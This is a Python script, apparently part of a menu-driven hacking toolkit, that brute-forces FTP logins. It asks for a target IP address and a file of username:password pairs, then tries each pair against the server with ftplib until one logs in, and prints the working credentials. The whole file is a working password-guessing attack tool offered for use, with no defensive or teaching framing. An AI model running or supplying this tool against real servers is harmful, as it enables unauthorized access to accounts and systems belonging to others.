#!/usr/bin/python3

import ftplib
import os
from termcolor import colored, cprint

def execute():
	os.system("clear")
	os.system("figlet -f Braced 'F.T.P. BRUTEFORCER'|lolcat -a -d 1")
	os.system('echo "╔───────────────────────────────────────────────╗" | lolcat -a -d 1')
	os.system('echo "|           Created By: Rajnish Kumar           |" | lolcat -a -d 1')
	os.system('echo "┖───────────────────────────────────────────────┙\n\n" | lolcat -a -d 1')
	host = input(colored("|> Enter Targets IP Address: ",'green',attrs=['bold']))
	passwdfile = input(colored('|> Enter User/Password File Path: ','yellow',attrs=['bold']))
	print(colored("\n# Bruteforcing In Progress . . .\n", 'green', attrs=['bold', 'blink']))
	brutelogin(host, passwdfile)
	menu()

def menu():
	option = int(input(colored("\n\nDo you want to:\n[1] Bruteforce Again\n[2] Go Back\n[3] Main Menu\n[4] Exit\n\n>>>Select Your Choice: ",'yellow', attrs=['bold'])))
	if option == 1:
		os.system('python3 ftpbrute.py && cd ..')

	elif option == 2:
		os.system('python3 ftpscript.py && cd ..')

	elif option == 3:
		os.system('cd .. && python3 omnitrix.py')

	elif option == 4:
		os.system('echo "Good Bye! Have A Great Day . . ."|lolcat -a -i -d 50 -F 0.5')
		exit()
	else:
		print(colored("\n[!] Error! Select Correct Option","red", attrs=['bold', 'blink']))
		input(colored("\n{#} Press Key To Continue . . .","green"))
		os.system("clear")
		menu()


def brutelogin(hostname, passwdfile):
	try:
		passF = open(passwdfile, 'r')
	except:
		print("[!] File Doesn't Exist!")
	for line in passF.readlines():
		Username = line.split(':')[0]
		Password = line.split(':')[1].strip('\n')
		cprint("[*] Trying: Username={} & Password={}".format(Username,Password), 'red', attrs=['bold'])
		#print(colored("[-] Trying: Username={}  Password={}".format(Username,Password),'red'))
		try:
			ftp = ftplib.FTP(hostname)
			login= ftp.login(Username, Password)
			cprint("\n[+] Login Succeeded With: Username = {} & Password = {}\n".format(Username,Password), 'green', attrs=['bold','underline'])
			print(colored("# Stopping Bruteforce . . .\n".format(Username,Password),'green', attrs=['bold']))
			ftp.quit()
			return(Username,Password)
		except:
			pass
	print("[-] Password Not In List")

execute()

#host = input("[*] Enter Targets IP Address: ")
#passwdfile = input('[*] Enter User/Password File Path: ')
#print(colored("\n# Bruteforcing In Progress . . .\n", 'green', attrs=['bold', 'blink']))
#brutelogin(host, passwdfile)
#menu()
